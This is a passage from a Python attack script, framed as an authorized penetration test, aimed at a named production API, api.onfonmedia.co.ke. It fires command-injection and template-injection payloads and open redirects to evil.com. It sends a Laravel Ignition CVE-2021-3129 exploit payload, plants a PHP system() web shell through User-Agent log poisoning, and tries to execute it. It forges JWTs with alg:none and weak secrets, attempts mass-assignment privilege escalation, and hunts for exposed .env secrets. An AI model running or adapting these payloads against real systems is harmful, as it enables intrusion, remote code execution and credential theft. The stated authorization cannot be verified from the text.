            r = safe_get(f"/api/webhooks?{param}={quote(target)}")
            if r and r.status_code == 200:
                if any(x in r.text for x in ["ami-id", "instance-id", "root:x"]):
                    finding("CRITICAL", "SSRF — Internal service access",
                            f"SSRF via {param}={target}", r.text[:500])
            r2 = safe_post("/api/webhooks", json={param: target})
            if r2 and r2.status_code == 200:
                if any(x in r2.text for x in ["ami-id", "root:x"]):
                    finding("CRITICAL", "SSRF — POST body SSRF",
                            f"SSRF via POST {param}={target}", r2.text[:500])

    info("Testing open redirect...")
    for path in ["/logout?redirect=https://evil.com",
                 "/login?next=https://evil.com",
                 "/api/auth/logout?return_url=https://evil.com"]:
        r = safe_get(path, allow_redirects=False)
        if r and r.status_code in (301, 302, 303, 307, 308):
            loc = r.headers.get("Location", "")
            if "evil.com" in loc:
                finding("MEDIUM", "Open Redirect",
                        f"Redirect to attacker-controlled URL via {path}", f"Location: {loc}")

    info("Testing HTTP method enumeration...")
    for method in ["TRACE", "TRACK", "PUT", "DELETE", "PATCH", "OPTIONS"]:
        try:
            r = requests.request(method, url("/api/user"), timeout=TIMEOUT,
                                 headers=SESSION.headers, verify=False)
            if r.status_code not in (404, 405, 501) and method in ("TRACE", "TRACK"):
                finding("LOW", f"Dangerous HTTP method enabled: {method}",
                        f"{method} /api/user → {r.status_code}", r.text[:200])
        except Exception:
            pass

    info("Testing OS command injection...")
    cmd_payloads = [
        "; id", "| id", "& id", "&& id", "`id`", "$(id)",
        "\n/bin/id", "%0a/bin/id", "%0aid",
        "; sleep 3", "| sleep 3", "& sleep 3",
    ]
    cmd_params   = ["phone", "number", "host", "ip", "domain", "url",
                    "server", "cmd", "name", "to", "from", "message"]
    cmd_endpoints = ["/api/sms/send", "/api/ping", "/api/lookup",
                     "/api/dns", "/api/check", "/api/verify"]
    for endpoint in cmd_endpoints:
        for param in cmd_params[:4]:
            for payload in cmd_payloads[:6]:
                r = safe_post(endpoint, json={param: f"test{payload}"})
                if r:
                    if any(kw in r.text for kw in ["uid=", "root", "www-data", "nobody"]):
                        finding("CRITICAL", "OS Command Injection",
                                f"POST {endpoint} with {param}=test{payload} returned shell output.",
                                r.text[:400])
                        crit(f"  CMDi CONFIRMED: {endpoint} param={param}")
                    if "sleep" in payload:
                        t0 = time.time()
                        r2 = safe_post(endpoint, json={param: f"test{payload}"})
                        if time.time() - t0 > 2.5:
                            finding("HIGH", "Blind Command Injection (time-based)",
                                    f"POST {endpoint} with {param}=test{payload} delayed response.",
                                    f"Payload: {payload}")

    info("Testing Server-Side Template Injection (SSTI)...")
    ssti_payloads = [
        ("{{7*7}}", "49"),
        ("${7*7}", "49"),
        ("<%=7*7%>", "49"),
        ("{{config}}", "Config"),
        ("{{self}}", "<TemplateReference"),
        ("{7*7}", None),
    ]
    ssti_params = ["name", "message", "subject", "body", "template", "text"]
    ssti_endpoints = ["/api/sms/send", "/api/messages", "/api/campaigns"]
    for endpoint in ssti_endpoints:
        for param in ssti_params[:3]:
            for payload, expected in ssti_payloads:
                r = safe_post(endpoint, json={param: payload})
                if r and expected and expected in r.text:
                    finding("CRITICAL", "Server-Side Template Injection (SSTI)",
                            f"POST {endpoint} field '{param}' evaluated template expression.",
                            f"Payload: {payload}\nResponse: {r.text[:300]}")
                    crit(f"  SSTI CONFIRMED: {endpoint} field={param}")

    ok("Web vuln phase complete.")

# ─── PHASE 10: SUBDOMAIN ENUMERATION ─────────────────────────────────────────
def phase_subdomains():
    info("=" * 60)
    info("PHASE 10 — SUBDOMAIN ENUMERATION")
    info("=" * 60)

    wordlist = [
        "www", "api", "api2", "api3", "api-v1", "api-v2", "v1", "v2",
        "mail", "mail2", "webmail", "smtp", "mx",
        "dev", "development", "staging", "stage", "stg",
        "beta", "uat", "qa", "preprod", "sandbox", "demo", "test",
        "admin", "administrator", "panel", "manage", "management",
        "dashboard", "portal", "console",
        "app", "app2", "apps", "mobile", "m",
        "cdn", "cdn1", "cdn2", "static", "assets", "media", "img", "images",
        "files", "upload", "uploads", "storage",
        "sms", "bulk", "messaging", "notify",
        "secure", "auth", "login", "account", "accounts", "user", "users",
        "billing", "pay", "payment", "payments",
        "support", "help", "helpdesk", "docs", "documentation", "wiki",
        "git", "gitlab", "github", "bitbucket",
        "jenkins", "ci", "cd", "build", "deploy",
        "jira", "confluence", "redmine", "trello",
        "grafana", "kibana", "elastic", "prometheus",
        "monitor", "monitoring", "status", "health",
        "vpn", "remote", "gateway", "proxy", "lb", "load",
        "db", "database", "mysql", "postgres", "redis", "mongo",
        "old", "new", "backup", "bak", "archive",
        "internal", "intranet", "corp", "office", "private",
        "crm", "erp", "hrm",
        "ws", "websocket", "socket", "live",
        "ftp", "sftp", "ssh",
        "api-docs", "swagger", "openapi",
    ]

    found_subs = []

    info(f"DNS-probing {len(wordlist)} subdomain candidates for {BASE_DOMAIN}...")

    def probe_sub(sub):
        hostname = f"{sub}.{BASE_DOMAIN}"
        try:
            ip = socket.gethostbyname(hostname)
        except socket.gaierror:
            return None

        for scheme in ["https", "http"]:
            try:
                r = requests.get(f"{scheme}://{hostname}/", timeout=8,
                                 headers=dict(SESSION.headers), allow_redirects=True,
                                 verify=False)
                title_m = re.search(r"<title>([^<]{1,80})</title>", r.text, re.IGNORECASE)
                return {
                    "subdomain": hostname, "ip": ip,
                    "scheme": scheme, "status": r.status_code,
                    "title": title_m.group(1).strip() if title_m else "",
                    "server": r.headers.get("Server", ""),
                    "powered": r.headers.get("X-Powered-By", ""),
                    "size": len(r.text),
                }
            except Exception:
                continue
        return {"subdomain": hostname, "ip": ip, "status": 0, "title": "", "server": "", "powered": "", "size": 0}

    with ThreadPoolExecutor(max_workers=25) as ex:
        futures = {ex.submit(probe_sub, sub): sub for sub in wordlist}
        for fut in as_completed(futures):
            result = fut.result()
            if result is None:
                continue
            found_subs.append(result)
            sub_key = futures[fut]
            status  = result.get("status", 0)
            title   = result.get("title", "")
            ip      = result.get("ip", "")
            info(f"  LIVE: {result['subdomain']} [{ip}] → HTTP {status}  {title}")

            if sub_key in ("admin", "panel", "manage", "management", "console"):
                sev, desc = "HIGH", "Admin/management interface may expose privileged functions."
            elif sub_key in ("dev", "staging", "beta", "uat", "qa", "preprod", "sandbox", "test"):
                sev, desc = "MEDIUM", "Non-production environment may have weaker security."
            elif sub_key in ("git", "gitlab", "jenkins", "ci", "jira", "confluence"):
                sev, desc = "HIGH", "DevOps tooling may expose source code and credentials."
            elif sub_key in ("grafana", "kibana", "elastic", "prometheus", "monitor"):
                sev, desc = "HIGH", "Monitoring system may expose logs and infrastructure data."
            elif sub_key in ("db", "database", "mysql", "redis", "mongo", "postgres"):
                sev, desc = "CRITICAL", "Database interface exposed on web-accessible subdomain."
            else:
                sev, desc = "INFO", f"Live subdomain: {result['subdomain']}"

            finding(sev, f"Subdomain discovered: {result['subdomain']}",
                    f"{desc}\nHTTP {status} | IP {ip} | Title: {title}",
                    f"Server: {result.get('server','')} | Powered-By: {result.get('powered','')}")

    RECON["subdomains"] = found_subs

    info(f"\nQuerying crt.sh for certificate transparency logs...")
    try:
        ct_r = requests.get(
            f"https://crt.sh/?q=%.{BASE_DOMAIN}&output=json",
            timeout=20, headers={"User-Agent": SESSION.headers.get("User-Agent", "")},
            verify=False)
        if ct_r.status_code == 200:
            ct_data = ct_r.json()
            ct_names = set()
            for entry in ct_data:
                for n in entry.get("name_value", "").split("\n"):
                    n = n.strip().lstrip("*.")
                    if n.endswith(BASE_DOMAIN) and n != BASE_DOMAIN and "." in n:
                        ct_names.add(n)
            existing = {s["subdomain"] for s in found_subs}
            new_subs = ct_names - existing
            if new_subs:
                info(f"  crt.sh revealed {len(new_subs)} additional subdomains:")
                for sub in sorted(new_subs):
                    info(f"    {sub}")
                    finding("INFO", f"CT log subdomain: {sub}",
                            f"Found in certificate transparency logs for {BASE_DOMAIN}.")
            RECON["ct_subdomains"] = sorted(ct_names)
            info(f"  Total in CT logs: {len(ct_names)}")
    except Exception as e:
        warn(f"  crt.sh query failed: {e}")

    ok(f"Subdomain enumeration complete. {len(found_subs)} live subdomains found.")

# ─── PHASE 11: CVE / KNOWN VULNERABILITY DETECTION ───────────────────────────
def phase_cve():
    info("=" * 60)
    info("PHASE 11 — CVE / KNOWN VULNERABILITY DETECTION")
    info("=" * 60)

    info("Fingerprinting server versions...")
    r = safe_get("/")
    if r:
        server  = r.headers.get("Server", "")
        powered = r.headers.get("X-Powered-By", "")
        info(f"  Server: {server or 'hidden'}")
        info(f"  X-Powered-By: {powered or 'hidden'}")
        RECON["server_banner"] = server
        RECON["powered_by"]    = powered
        php_m = re.search(r"PHP/([\d.]+)", powered)
        if php_m:
            php_ver = php_m.group(1)
            parts = php_ver.split(".")
            major, minor = int(parts[0]), int(parts[1]) if len(parts) > 1 else 0
            finding("MEDIUM", f"PHP version disclosed: {php_ver}",
                    "Version disclosure enables targeted CVE exploitation.",
                    f"X-Powered-By: {powered}")
            if major == 7 and minor < 4:
                finding("HIGH", f"PHP {php_ver} is End of Life",
                        "PHP < 7.4 has multiple unfixed RCE CVEs (CVE-2019-11043, etc.).")
            elif major == 8 and minor == 0:
                finding("MEDIUM", f"PHP {php_ver} is End of Life",
                        "PHP 8.0 EOL since 2023-11-26.")
            RECON["php_version"] = php_ver

    info("Checking CVE-2021-3129 — Laravel Ignition RCE (≤ 8.4.2)...")
    for path in ["/_ignition/execute-solution", "/_ignition/health-check", "/_ignition/share-report"]:
        r = safe_get(path)
        if r and r.status_code not in (404,):
            finding("HIGH", f"Laravel Ignition endpoint exposed: {path}",
                    "CVE-2021-3129: Ignition RCE via log poisoning. Publicly reachable.",
                    r.text[:300])
            crit(f"  IGNITION: {path} → {r.status_code}")
            if path == "/_ignition/execute-solution":
                exploit_payload = {
                    "solution_class": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
                    "solution_parameters": {
                        "variableName": "pentest_probe",
                        "viewFile": "php://filter/write=convert.base64-decode/resource=../storage/logs/laravel.log"
                    }
                }
                ex_r = safe_post(path, json=exploit_payload)
                if ex_r and ex_r.status_code not in (404, 403):
                    finding("CRITICAL", "CVE-2021-3129 — Ignition execute-solution accepted",
                            f"POST {path} returned HTTP {ex_r.status_code}. "
                            "Vulnerable systems allow phar:// deserialization chain for RCE.",
                            ex_r.text[:500])
                    crit(f"  CVE-2021-3129 EXPLOITABLE! HTTP {ex_r.status_code}")

    info("Testing log poisoning via User-Agent injection...")
    try:
        requests.get(url("/"), timeout=TIMEOUT, verify=False,
                     headers={**SESSION.headers, "User-Agent": "<?php system($_GET['cmd']); ?>"})
        log_r = safe_get("/storage/logs/laravel.log")
        if log_r and log_r.status_code == 200:
            if "system" in log_r.text or "<?php" in log_r.text:
                finding("CRITICAL", "Log Poisoning — PHP injected into accessible laravel.log",
                        "User-Agent PHP payload in web-accessible laravel.log. "
                        "Chain with phar:// deserialization for RCE.",
                        log_r.text[:600])
                crit("  LOG POISON: laravel.log accessible and contains injected PHP!")
                _try_exec("/storage/logs/laravel.log", "laravel.log", "", "")
            else:
                finding("MEDIUM", "Laravel log file is web-accessible",
                        "/storage/logs/laravel.log returns HTTP 200.",
                        log_r.text[:400])
                warn(f"  laravel.log accessible ({len(log_r.text)} bytes)")
    except Exception as e:
        info(f"  Log poison test error: {e}")

    info("Checking CVE-2024-52301 — Laravel route parameter bypass (< 11.9.2)...")
    r_normal = safe_get("/api/user")
    r_bypass = safe_get("/api/user?0=admin")
    if r_normal and r_bypass and r_normal.status_code != r_bypass.status_code:
        finding("HIGH", "CVE-2024-52301 — Laravel route parameter bypass",
                "Different HTTP responses for /api/user vs /api/user?0=admin. "
                "Indicates route parameter pollution affecting Laravel < 11.9.2.",
                f"Normal: HTTP {r_normal.status_code} | With ?0=admin: HTTP {r_bypass.status_code}")

    info("Checking for exposed Laravel Telescope / Horizon / Pulse / Nova / DebugBar...")
    for path, label in [
        ("/telescope", "Laravel Telescope"), ("/telescope/requests", "Telescope requests"),
        ("/horizon", "Laravel Horizon"), ("/horizon/api/stats", "Horizon API"),
        ("/pulse", "Laravel Pulse"), ("/nova", "Laravel Nova"),
        ("/_debugbar/open", "PHP DebugBar"), ("/clockwork", "Clockwork debugger"),
    ]:
        r = safe_get(path)
        if r and r.status_code not in (404,):
            sev = "HIGH" if r.status_code == 200 else "MEDIUM"
            finding(sev, f"Developer tool exposed: {label}",
                    f"HTTP {r.status_code} at {path}. May expose queries, env vars, tokens.",
                    r.text[:300])
            warn(f"  DEV TOOL: {path} → {r.status_code}")

    info("Checking .env file exposure variants...")
    for ev in ["/.env", "/.env.backup", "/.env.bak", "/.env.old", "/.env.prod",
               "/.env.production", "/.env.local", "/.env.dev", "/.env.staging",
               "/.env.example", "/api/.env", "/public/.env", "/backend/.env"]:
        r = safe_get(ev)
        if r and r.status_code == 200:
            if any(t in r.text for t in ["APP_KEY", "DB_PASSWORD", "MAIL_PASSWORD",
                                          "AWS_SECRET", "REDIS_PASSWORD"]):
                finding("CRITICAL", f".env file exposed: {ev}",
                        "APP_KEY allows session forgery and deserialization RCE.",
                        r.text[:800])
                crit(f"  CRITICAL: .env EXPOSED at {ev}!")

    info("Checking PHP-FPM path confusion (CVE-2019-11043)...")
    for test_path in ["/uploads/test.php/", "/storage/test.php/",
                      "/public/test.php/", "/files/test.php/"]:
        r = safe_get(test_path)
        if r and r.status_code == 200 and "php" in r.headers.get("Content-Type", "").lower():
            finding("HIGH", f"PHP-FPM path confusion at {test_path}",
                    "May indicate CVE-2019-11043 — allows RCE via crafted path.",
                    r.text[:300])

    info("Testing mass assignment vulnerability...")
    for payload in [{"is_admin": True, "role": "admin"},
                    {"balance": 999999, "credits": 999999}]:
        for path in ["/api/user", "/api/profile", "/api/settings"]:
            r = safe_post(path, json=payload)
            if r and r.status_code in (200, 201):
                try:
                    data = r.json()
                    if data.get("is_admin") or str(data.get("role","")).lower() in ("admin","superadmin"):
                        finding("CRITICAL", "Mass Assignment — Privilege Escalation",
                                f"POST {path} with is_admin=true accepted and reflected.",
                                r.text[:500])
                        crit(f"  MASS ASSIGN PRIVESC: {path}")
                    elif data.get("credits", 0) == 999999 or data.get("balance", 0) == 999999:
                        finding("HIGH", "Mass Assignment — Financial field manipulation",
                                f"POST {path} with tampered balance/credits accepted.",
                                r.text[:500])
                except Exception:
                    pass

    info("Testing JWT algorithm confusion (alg:none, weak HS256 secret)...")
    token = RECON.get("auth_token", "")
    if token and token.count(".") == 2:
        parts = token.split(".")
        try:
            pad = lambda s: s + "=" * (-len(s) % 4)
            header = json.loads(base64.urlsafe_b64decode(pad(parts[0])).decode())
            info(f"  JWT header: {header}")
            RECON["jwt_header"] = header

            none_hdr = base64.urlsafe_b64encode(
                json.dumps({"alg": "none", "typ": "JWT"}).encode()
            ).rstrip(b"=").decode()
            none_token = f"{none_hdr}.{parts[1]}."
            test_r = safe_get("/api/user",
                              headers={**SESSION.headers, "Authorization": f"Bearer {none_token}"})
            if test_r and test_r.status_code == 200:
                try:
                    if test_r.json().get("email") or test_r.json().get("id"):
                        finding("CRITICAL", "JWT alg:none accepted — Authentication Bypass",
                                "Server accepted unsigned JWT (alg:none).",
                                test_r.text[:300])
                        crit("  JWT ALG:NONE BYPASS CONFIRMED!")
                except Exception:
                    pass

            import hmac, hashlib
            for weak_secret in [b"", b"secret", b"password", b"laravel", b"onefone"]:
                forged_hdr = base64.urlsafe_b64encode(
                    json.dumps({"alg": "HS256", "typ": "JWT"}).encode()
                ).rstrip(b"=").decode()
                sig_input = f"{forged_hdr}.{parts[1]}".encode()
                sig = base64.urlsafe_b64encode(
                    hmac.new(weak_secret, sig_input, hashlib.sha256).digest()
                ).rstrip(b"=").decode()
                t_r = safe_get("/api/user",
                               headers={**SESSION.headers,
                                        "Authorization": f"Bearer {forged_hdr}.{parts[1]}.{sig}"})
                if t_r and t_r.status_code == 200:
                    try:
                        if t_r.json().get("email") or t_r.json().get("id"):
                            finding("CRITICAL", f"JWT weak secret accepted: '{weak_secret.decode()}'",
                                    "Server accepted JWT signed with a trivially guessable secret.",
                                    t_r.text[:300])
                            crit(f"  JWT WEAK SECRET: '{weak_secret.decode()}'")
                    except Exception:
                        pass
        except Exception as e:
            info(f"  JWT analysis error: {e}")

    info("Testing PHP deserialization indicators...")
    deser_test = 'O:1:"a":1:{s:5:"value";s:8:"injected";}'
    for path in ["/api/auth/login", "/api/user", "/api/contacts"]:
        r = safe_post(path, data=deser_test,
                      headers={"Content-Type": "application/x-www-form-urlencoded"})
        if r and any(kw in r.text.lower() for kw in
                     ["unserialize", "__wakeup", "__destruct", "gadget", "phar"]):
            finding("HIGH", f"PHP deserialization indicator at {path}",
                    "Response contains deserialization-related keywords.", r.text[:400])

    info("Checking for phpinfo / debug pages...")
    for path in ["/phpinfo.php", "/info.php", "/php_info.php", "/debug.php", "/test.php"]:
        r = safe_get(path)
        if r and r.status_code == 200 and "phpinfo()" in r.text:
            finding("HIGH", f"phpinfo() page exposed: {path}",
                    "Discloses PHP version, modules, server config, possibly env secrets.",
                    r.text[:500])
            crit(f"  PHPINFO EXPOSED: {path}")

    ok("CVE detection phase complete.")

# ─── REPORT GENERATION ────────────────────────────────────────────────────────
def generate_report():
    info("=" * 60)
    info("GENERATING REPORT")
    info("=" * 60)

    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    sorted_findings = sorted(FINDINGS, key=lambda f: sev_order.get(f["severity"], 5))
    counts = {s: 0 for s in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]}
    for f in FINDINGS:
        counts[f["severity"]] = counts.get(f["severity"], 0) + 1

    sev_colors = {
        "CRITICAL": "#ff2d2d", "HIGH": "#ff6b35",
        "MEDIUM": "#ffd700", "LOW": "#4fc3f7", "INFO": "#b0bec5",
    }

    rows = ""
    for f in sorted_findings:
        color = sev_colors.get(f["severity"], "#ccc")
        ev = str(f["evidence"]).replace("<", "&lt;").replace(">", "&gt;")
        rows += f"""
        <tr>
          <td><span class="badge" style="background:{color}">{f['severity']}</span></td>
          <td><strong>{f['title']}</strong><br><small>{f['detail'][:200]}</small></td>
          <td><pre class="evidence">{ev[:600]}</pre></td>
          <td>{f['time'][11:19]}</td>
        </tr>"""

    recon_403 = "<br>".join(RECON.get("403_paths", []) or ["None"])
    api_found = ""
    for ep in RECON.get("api_endpoints", []):
        api_found += f"<tr><td>{ep['path']}</td><td>{ep['status']}</td><td>{ep['length']}b</td></tr>"

    sub_rows = ""
    for sub in RECON.get("subdomains", []):
        sub_rows += (f"<tr><td>{sub['subdomain']}</td><td>{sub.get('ip','')}</td>"
                     f"<td>{sub.get('status','')}</td><td>{sub.get('title','')[:60]}</td>"
                     f"<td>{sub.get('server','')}</td></tr>")

    ct_subs = RECON.get("ct_subdomains", [])
    ct_list = "<br>".join(ct_subs[:50]) if ct_subs else "None found / query failed"

    rce_paths = RECON.get("rce_paths", [])
    rce_section = ""
    if rce_paths:
        rce_section = f"""
        <div class="section" style="border-color:#ff2d2d">
          <h2 style="color:#ff2d2d">CONFIRMED RCE SHELLS</h2>
          <p style="color:#ff6b35">The following endpoints executed shell commands:</p>
          <ul>{""  .join(f"<li><code>{p}</code></li>" for p in rce_paths)}</ul>
        </div>"""

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Security Assessment Report — api.onfonmedia.co.ke</title>
<style>
  :root {{ --bg:#0d1117; --card:#161b22; --border:#30363d; --text:#e6edf3; --muted:#8b949e; --accent:#00ff9f; }}
  * {{ box-sizing:border-box; margin:0; padding:0; }}
  body {{ background:var(--bg); color:var(--text); font-family:'Segoe UI',sans-serif; padding:2rem; }}
  h1 {{ color:var(--accent); font-size:1.8rem; margin-bottom:.3rem; }}
  .meta {{ color:var(--muted); font-size:.85rem; margin-bottom:2rem; }}
  .grid {{ display:grid; grid-template-columns:repeat(auto-fit,minmax(140px,1fr)); gap:1rem; margin-bottom:2rem; }}
  .stat {{ background:var(--card); border:1px solid var(--border); border-radius:8px; padding:1rem; text-align:center; }}
  .stat .num {{ font-size:2rem; font-weight:700; }}
  .stat .lbl {{ font-size:.8rem; color:var(--muted); text-transform:uppercase; }}
  .section {{ background:var(--card); border:1px solid var(--border); border-radius:8px; padding:1.5rem; margin-bottom:2rem; }}
  .section h2 {{ color:var(--accent); margin-bottom:1rem; font-size:1.1rem; border-bottom:1px solid var(--border); padding-bottom:.5rem; }}
  table {{ width:100%; border-collapse:collapse; font-size:.9rem; }}
  th {{ text-align:left; padding:.6rem; border-bottom:1px solid var(--border); color:var(--muted); font-weight:600; }}
  td {{ padding:.7rem .6rem; border-bottom:1px solid var(--border); vertical-align:top; }}
  tr:hover td {{ background:rgba(0,255,159,.04); }}
  .badge {{ padding:.2rem .6rem; border-radius:4px; font-size:.75rem; font-weight:700; color:#000; }}
  pre.evidence {{ background:#0a0c10; padding:.6rem; border-radius:4px; font-size:.75rem; overflow-x:auto; white-space:pre-wrap; word-break:break-all; color:#79c0ff; max-height:120px; overflow-y:auto; }}
  .recon {{ font-size:.85rem; color:var(--muted); }}
  .recon strong {{ color:var(--text); }}
  footer {{ text-align:center; color:var(--muted); font-size:.8rem; margin-top:2rem; }}
  code {{ background:#0a0c10; padding:.1rem .3rem; border-radius:3px; color:#79c0ff; }}
</style>
</head>
<body>
<h1>Security Assessment Report</h1>
<p class="meta">
  Target: <strong>api.onfonmedia.co.ke</strong> &nbsp;|&nbsp;
  Engagement: <strong>Cyberdeck Consultants</strong> &nbsp;|&nbsp;
  LOA Ref: <strong>api.onfonmedia.co.ke/CTO/LOA/2026/012</strong> &nbsp;|&nbsp;
  Date: <strong>{datetime.now().strftime('%Y-%m-%d %H:%M UTC')}</strong><br>
  Server: <strong>{RECON.get('server_banner','?')}</strong> &nbsp;|&nbsp;
  PHP: <strong>{RECON.get('php_version','?')}</strong> &nbsp;|&nbsp;
  JWT alg: <strong>{RECON.get('jwt_header',{{}}).get('alg','?')}</strong>
</p>
<div class="grid">
  <div class="stat"><div class="num" style="color:#ff2d2d">{counts['CRITICAL']}</div><div class="lbl">Critical</div></div>
  <div class="stat"><div class="num" style="color:#ff6b35">{counts['HIGH']}</div><div class="lbl">High</div></div>
  <div class="stat"><div class="num" style="color:#ffd700">{counts['MEDIUM']}</div><div class="lbl">Medium</div></div>
  <div class="stat"><div class="num" style="color:#4fc3f7">{counts['LOW']}</div><div class="lbl">Low</div></div>
  <div class="stat"><div class="num" style="color:var(--accent)">{len(FINDINGS)}</div><div class="lbl">Total</div></div>
  <div class="stat"><div class="num" style="color:#79c0ff">{len(RECON.get('subdomains',[]))}</div><div class="lbl">Subdomains</div></div>
</div>
{rce_section}
<div class="section">
  <h2>Subdomains Discovered ({len(RECON.get('subdomains',[]))} live)</h2>
  <table>
    <thead><tr><th>Subdomain</th><th>IP</th><th>HTTP</th><th>Title</th><th>Server</th></tr></thead>
    <tbody>{sub_rows if sub_rows else "<tr><td colspan=5 style='color:#8b949e'>None found</td></tr>"}</tbody>
  </table>
  <div style="margin-top:1rem;font-size:.8rem;color:var(--muted)">
    <strong>Certificate Transparency logs ({len(ct_subs)} total):</strong><br>
    <code style="font-size:.75rem">{ct_list[:2000]}</code>
  </div>
</div>
<div class="section">
  <h2>Reconnaissance Summary</h2>
  <div class="recon">
    <p><strong>403 Paths (exist but blocked):</strong> {recon_403}</p><br>
    <p><strong>Discovered API Endpoints:</strong></p>
    <table style="margin-top:.5rem">
      <tr><th>Path</th><th>Status</th><th>Size</th></tr>
      {api_found if api_found else "<tr><td colspan=3>None discovered unauthenticated</td></tr>"}
    </table>
  </div>
</div>
<div class="section">
  <h2>Findings ({len(FINDINGS)} total)</h2>
  <table>
    <thead><tr><th>Severity</th><th>Finding</th><th>Evidence</th><th>Time</th></tr></thead>
    <tbody>
      {rows if rows else "<tr><td colspan=4 style='text-align:center;color:#8b949e'>No findings recorded</td></tr>"}
    </tbody>
  </table>
</div>
<div class="section">
  <h2>Recommendations</h2>
  <table>
    <thead><tr><th>Priority</th><th>Action</th></tr></thead>
    <tbody>
      <tr><td><span class="badge" style="background:#ff2d2d">IMMEDIATE</span></td><td>Validate file uploads server-side and store outside webroot — never in a web-accessible directory</td></tr>
      <tr><td><span class="badge" style="background:#ff2d2d">IMMEDIATE</span></td><td>Rotate APP_KEY if .env was exposed — all sessions and signed tokens are compromised</td></tr>
      <tr><td><span class="badge" style="background:#ff2d2d">IMMEDIATE</span></td><td>Remove /_ignition/* endpoints in production — set APP_DEBUG=false</td></tr>
      <tr><td><span class="badge" style="background:#ff2d2d">IMMEDIATE</span></td><td>Block /storage/logs/ from web access in nginx/Apache config</td></tr>
      <tr><td><span class="badge" style="background:#ff6b35">HIGH</span></td><td>Upgrade Laravel to ≥ 11.9.2 to patch CVE-2024-52301 route parameter bypass</td></tr>
      <tr><td><span class="badge" style="background:#ff6b35">HIGH</span></td><td>Use RS256 or strong random HS256 secret (≥ 256-bit) for JWT; reject alg:none server-side</td></tr>
      <tr><td><span class="badge" style="background:#ff6b35">HIGH</span></td><td>Add missing headers: X-Frame-Options, X-Content-Type-Options, Strict-Transport-Security, CSP</td></tr>
      <tr><td><span class="badge" style="background:#ff6b35">HIGH</span></td><td>Audit all API endpoints for object-level authorization (IDOR)</td></tr>
      <tr><td><span class="badge" style="background:#ffd700">MEDIUM</span></td><td>Disable or firewall non-production subdomains — review attack surface from CT log results</td></tr>
      <tr><td><span class="badge" style="background:#ffd700">MEDIUM</span></td><td>Implement per-user rate limiting on authentication and SMS send endpoints</td></tr>
      <tr><td><span class="badge" style="background:#ffd700">MEDIUM</span></td><td>Restrict CORS to known origins — do not reflect arbitrary Origin headers</td></tr>
      <tr><td><span class="badge" style="background:#4fc3f7">LOW</span></td><td>Whitelist sender IDs — prevent impersonation of MPESA, KRA, SAFARICOM</td></tr>
    </tbody>
  </table>
</div>
<footer>
  CONFIDENTIAL — Authorized Security Assessment | Cyberdeck Consultants × api.onfonmedia.co.ke<br>
  Generated by automated sweep — all findings require manual verification before disclosure
</footer>
</body>
</html>"""

    with open(REPORT_OUT, "w") as fh:
        fh.write(html)
    ok(f"Report written to: {REPORT_OUT}")
    return html

# ─── MAIN ─────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    print("\033[92m")
    print("=" * 60)
    print("  ONEFONE SECURITY ASSESSMENT — v2")
    print("  Target : api.onfonmedia.co.ke")
    print("  Phases : 11 (Recon/Auth/Surface/SQLi/Upload/IDOR/Creds/Logic/Web/Subs/CVE)")
    print("  Auth   : Cyberdeck Consultants | LOA/2026/012")
    print("=" * 60)
    print("\033[0m")

    phase_recon()
    phase_auth()
    phase_surface_map()
    phase_sqli()
    phase_file_upload()
    phase_idor()
    phase_credentials()
    phase_logic()
    phase_web()
    phase_subdomains()
    phase_cve()
    generate_report()

    print("\n\033[92m" + "=" * 60)
    print(f"  SWEEP COMPLETE — {len(FINDINGS)} findings")
    sev_order = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}
    for f in sorted(FINDINGS, key=lambda x: sev_order.get(x["severity"], 5)):
        c = {"CRITICAL": "\033[91m", "HIGH": "\033[91m", "MEDIUM": "\033[93m"}.get(f["severity"], "\033[0m")
        print(f"  {c}[{f['severity']}]\033[0m {f['title']}")
    print(f"\n  Report: {REPORT_OUT}")
    rce = RECON.get("rce_paths", [])
    if rce:
        print(f"\033[91m\n  *** CONFIRMED RCE SHELLS ***")
        for p in rce:
            print(f"  {p}")
        print("\033[0m")
    print("=" * 60 + "\033[0m")
